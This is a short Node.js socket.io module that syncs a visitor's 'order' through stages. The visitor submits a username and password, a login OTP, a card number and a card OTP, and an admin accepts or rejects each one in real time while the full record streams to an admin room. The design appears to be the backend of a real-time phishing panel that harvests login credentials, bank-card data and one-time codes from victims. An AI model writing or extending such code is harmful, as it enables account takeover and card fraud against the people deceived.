/** Stored review flag or inferred pending state for legacy documents missing fields */
function reviewTri(stored, inferredPending) {
  if (stored === false) return false;
  if (stored === true) return true;
  return inferredPending;
}

/**
 * @param {object} plain Lean order / plain object with _id and acceptance flags
 */
function buildVisitorSyncPayload(plain) {
  const id = plain._id?.toString?.() ?? String(plain._id ?? "");
  return {
    orderId: id,
    rejectReason: plain.rejectReason || null,
    loginAccept: !!plain.loginAccept,
    otpLoginAccept: !!plain.otpLoginAccept,
    cardAccept: !!plain.cardAccept,
    cardOtpAccept: !!plain.cardOtpAccept,
    formAccept: !!plain.formAccept,
    reviewLogin: reviewTri(
      plain.reviewLogin,
      !plain.loginAccept && !!(plain.username || plain.password),
    ),
    reviewLoginOtp: reviewTri(
      plain.reviewLoginOtp,
      !!plain.otpLogin && !plain.otpLoginAccept,
    ),
    reviewVisa: reviewTri(
      plain.reviewVisa,
      !!plain.cardNumber && !plain.cardAccept,
    ),
    reviewCardOtp: reviewTri(
      plain.reviewCardOtp,
      !!plain.cardOtp && !plain.cardOtpAccept,
    ),
    /** Only true after visitor POST /form-data (explicit DB flag) */
    reviewForm: plain.reviewForm === true,
  };
}

/**
 * @param {import('socket.io').Server} io
 * @param {object} order Mongoose doc or plain object with _id
 */
function emitWorkflowUpdate(io, order) {
  let plain;
  if (typeof order.toObject === "function") {
    plain = order.toObject();
  } else if (order && typeof order === "object") {
    plain = { ...order };
  } else {
    plain = {};
  }
  const id = plain._id?.toString?.() ?? String(plain._id ?? "");
  io.to(`order:${id}`).emit("visitor:stage", buildVisitorSyncPayload(plain));
  io.to("admin").emit("admin:orderUpdated", {
    orderId: id,
    order: plain,
  });
  io.emit("newUser");
}

module.exports = { emitWorkflowUpdate, buildVisitorSyncPayload };
